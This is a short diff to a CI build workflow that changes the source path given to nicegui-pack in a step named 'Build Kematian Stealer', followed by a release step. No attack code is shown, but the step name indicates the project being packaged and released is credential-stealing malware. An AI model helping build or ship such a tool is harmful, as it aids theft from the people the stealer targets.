@@ -40,7 +40,7 @@ jobs:
     
     - name: Build Kematian Stealer
       run: |
-        nicegui-pack --onefile --name "main" panel-src\main.py
+        nicegui-pack --onefile --name "main" main.py
 
     # Delete-tag-and-release new
     - name: Delete-tag-and-release
